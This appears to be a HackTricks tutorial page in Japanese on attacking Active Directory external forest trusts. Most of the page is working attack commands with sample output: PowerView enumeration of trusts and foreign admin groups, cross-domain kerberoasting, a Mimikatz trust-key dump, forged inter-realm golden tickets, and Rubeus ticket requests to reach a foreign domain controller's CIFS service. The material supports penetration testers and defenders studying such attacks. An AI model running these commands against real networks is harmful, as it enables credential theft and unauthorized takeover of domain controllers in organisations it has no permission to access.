# 外部フォレストドメイン - 一方向（インバウンド）または双方向

{{#include ../../banners/hacktricks-training.md}}

このシナリオでは、外部ドメインがあなたを信頼している（または両方が互いに信頼している）ため、何らかのアクセスを得ることができます。

## 列挙

まず最初に、**信頼**を**列挙**する必要があります：
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
前の列挙で、ユーザー **`crossuser`** が **`External Admins`** グループに属しており、**外部ドメインのDC内で管理者アクセス**を持っていることがわかりました。

## 初期アクセス

他のドメインでユーザーの**特別な**アクセスを見つけられなかった場合でも、ADメソッドに戻り、**特権のないユーザーからの昇格**を試みることができます（例えば、kerberoastingなど）：

**Powerview関数**を使用して、`-Domain`パラメータを使って**他のドメイン**を**列挙**できます。
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## なりすまし

### ログイン

外部ドメインにアクセス権を持つユーザーの資格情報を使用して、通常の方法でアクセスできるはずです:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID履歴の悪用

フォレストトラストを通じて[**SID履歴**](sid-history-injection.md)を悪用することもできます。

ユーザーが**あるフォレストから別のフォレストに移行され**、**SIDフィルタリングが有効でない**場合、**他のフォレストからSIDを追加する**ことが可能になり、この**SID**は**トラストを通じて認証する際にユーザーのトークンに追加されます**。

> [!WARNING]
> リマインダーとして、署名キーを取得するには
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

**信頼された**キーで**現在のドメインのユーザーを模倣する**TGTに**署名する**ことができます。
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### ユーザーを完全に偽装する方法
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
{{#include ../../banners/hacktricks-training.md}}
